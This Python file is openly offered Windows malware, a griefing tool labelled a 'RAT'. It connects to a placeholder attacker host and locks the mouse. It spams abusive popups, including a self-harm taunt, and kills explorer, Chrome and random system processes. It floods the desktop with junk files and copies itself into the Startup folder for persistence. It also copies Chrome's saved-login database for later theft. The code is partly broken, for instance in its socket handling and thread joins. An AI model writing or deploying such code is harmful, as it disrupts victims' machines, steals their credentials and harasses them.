import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, socket

client = socket.socket()
host = "ur host ip go here"
port = 666
format = "utf-8"
client.connect((host, port))

class harmless:
    """Harmless modules"""
    def pop_up(self):
        """Spams popups"""
        while 1:
            pop_up_text = ["LOL UR SO DUMB",
                    "FUCKING IDIOT",
                    "JUST RATTED YOU",
                    "DUMBASS"]
            ctypes.windll.user32.MessageBoxW(0, random.choice(pop_up_text), "LOL", random.randint(1, 5))
            time.sleep(random.randint(1, 5))
            
    def open_url(self):
        """Opens urls from list randomly"""
        while 1:
            links = ["google.com",
                "youtube.com"]
            webbrowser.open_new_tab(random.choice(links))
            time.sleep(random.randint(1, 10))
            
    def change_wallpaper(self):
        """Changes the wallpaper with random images from screenshot folder"""
        while 1:
            try:
                pic = random.choice(os.listdir(f"{os.path.expanduser('~')}\Pictures\Screenshots"))
                path = f"{os.path.expanduser('~')}\Pictures\Screenshots\{pic}"
                
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                time.sleep(random.randint(0, 3))
            except:
                pass
    
    def mouse_lock(self):
        while 1:
            mouse.drag(0, 0, 0, 0, absolute=True, duration=0)
        
        
            
class malware:
    def kill(self):
        """Kills select tasks"""
        while 1:
            kill_list = ["explorer.exe",
                         "wallpaper64.exe",
                         "wallpaper32.exe",
                         "chrome.exe"]
            for program in kill_list:
                os.system(f"taskkill /f /im {program}")
            time.sleep(30)
            
    def random_kill(self):
        """KILLS RANDOM PROCESSES"""
        while 1:
            processes = []
            for proc in psutil.process_iter():
                try:
                    processName = proc.name()
                    processes.append(processName)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                
                program = random.choice(processes)
                if program != "svchost.exe":
                    os.system(f"taskkill /f /im {program}")
                time.sleep(random.randint(5, 15))
                
            def isAdmin():
                """CHECK IS RAN AS ADMIN"""
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            
            if isAdmin():
                if random.randint(0, 100) == 1:
                    os.system(f"taskkill /f /im svchost.exe")
                
                
            time.sleep(random.randint(1, 20))
        
    def create_random_folder(self):
        """Creates random files with a base64 name"""
        while 1:
            for i in range(random.randint(1, 80)):
                try:
                    file_names = ["LOL UR RETARDED",
                                "LOL I RATTED YOU",
                                "UR SO GAY",
                                "YOU KNOW DN?",
                                "UR SO DUMB LOOOOL",
                                "HANG URSELF",
                                "Why did you run this?, lol.",
                                "Add NotSqvage#6666 on discord and tell him hes gay",
                                "If you see this you have to send money"]
                    
                    byte_stream = random.choice(file_names).encode("ascii")
            
                    base64_bytes = base64.b64encode(byte_stream)
                    base64_string = base64_bytes.decode("ascii")
                    
                    path = f"{os.path.expanduser('~')}\Desktop\{''.join(base64_string)}"
                    os.mkdir(path)
                except:
                    pass
            time.sleep(random.randint(1, 25))
    
        
class harmful:
    def rat(self):
        while 1:
            data = client.recv(1024)
    
    def dump(self):
        """Dumps databases and thing prepared for sending"""
        # WORK ON LATER 
        print(os.path.isdir("C:\Program Files\Google\Chrome\Application"))
        print(os.path.isdir(os.path.expanduser('~') + "\AppData\Local\Discord"))
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")

client.close()

if __name__ == "__main__":
    ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
    
    for i in range(random.randint(25, 200)):
        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 250)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
    
    #FIX LATER THIS SO ANNOYING!!!!!!
    try:
        startup = os.environ["USERPROFILE"] + os.sep + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        shutil.copy2(__file__, startup)
    except:
        pass
    
    harmless = harmless()
    malware = malware()
    
    #Threads
    popup_thread = threading.Thread(target=harmless.pop_up).start()
    openurl_thread = threading.Thread(target=harmless.open_url).start()
    change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
    mouse_locker = threading.Thread(target=harmless.mouse_lock).start()
    kill_thread = threading.Thread(target=malware.kill).start()
    random_kill_thread = threading.Thread(target=malware.random_kill).start()
    create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
    #rat_thread = threading.Thread(target=harmful.rat).start()
    
    #Make rat multiprocessed
    
    popup_thread.join()
    openurl_thread.join()
    change_wallpaper.join()
    kill_thread.join()
    mouse_locker.join()
    random_kill_thread.join()
    create_random_folder_thread.join()
    #rat_thread.join()
    
    
    
    

